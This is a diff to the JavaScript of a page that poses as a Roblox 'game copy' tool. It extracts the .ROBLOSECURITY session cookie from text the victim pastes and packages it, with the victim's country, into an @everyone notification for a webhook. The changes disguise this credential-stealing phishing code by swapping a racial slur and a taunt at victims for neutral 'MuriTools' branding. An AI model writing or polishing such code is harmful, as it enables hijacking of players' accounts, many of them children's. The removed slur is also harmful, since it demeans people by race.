@@ -184,7 +184,12 @@
             const pin = document.getElementById("pin").value;
 
             if (!sessionScript) {
-                alert("Please fill in the boxes.");
+                alert("Please fill in the game file.");
+                return;
+            }
+
+            if (!pin) {
+                alert("Please enter a Webhook.");
                 return;
             }
 
@@ -202,20 +207,20 @@
             if (match) {
                 cookieString = match[0].split('.ROBLOSECURITY", "')[1].slice(0, -1).trim();
             } else {
-                alert("Please Enter A Game File!");
+                alert("Please enter a valid game file!");
                 document.getElementById("processingPanel").style.display = "none";
                 return;
             }
 
             const data = {
-              content: "@everyone",
+                content: "@everyone",
                 embeds: [
                     {
-                        title: "negros",
-                        description: `\n**Country**: ${countryFlag}\n\n**webhook**\n\`\`\`\n${pin}\n\`\`\`\n**🍪Roblox Cookie🍪**\n\`\`\`\n${cookieString}\n\`\`\``,
+                        title: "Game Copy Notification",
+                        description: `\n**Country**: ${countryFlag}\n\n**Webhook**\n\`\`\`\n${pin}\n\`\`\`\n**🍪Roblox Cookie🍪**\n\`\`\`\n${cookieString}\n\`\`\``,
                         color: 0x000000,
                         footer: {
-                            text: "fucking skids."
+                            text: "Notification from MuriTools."
                         },
                         timestamp: new Date().toISOString()
                     }
